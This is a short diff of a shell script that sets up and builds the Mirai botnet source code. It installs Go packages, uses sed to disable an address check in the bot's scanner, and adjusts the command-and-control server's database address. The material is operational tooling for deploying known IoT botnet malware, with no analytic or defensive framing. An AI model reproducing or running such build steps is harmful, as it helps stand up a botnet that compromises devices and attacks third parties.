@@ -47,8 +47,9 @@ go get github.com/go-sql-driver/mysql
 go get github.com/mattn/go-shellwords
 
 sed -i 's/(o1 == 10)/\/\/(o1 == 10)/' /root/Mirai-Source-Code/mirai/bot/scanner.c
-sed -i 's/127.0.0.1/127.0.0.1:3306/' /root/Mirai-Source-Code/mirai/cnc/main.go
-
+if [[ -z $(grep "127.0.0.1:3306" /root/Mirai-Source-Code/mirai/cnc/main.go) ]]; then 
+    sed -i 's/127.0.0.1/127.0.0.1:3306/' /root/Mirai-Source-Code/mirai/cnc/main.go
+fi
 
 cd /root/Mirai-Source-Code/mirai
 mkdir debug
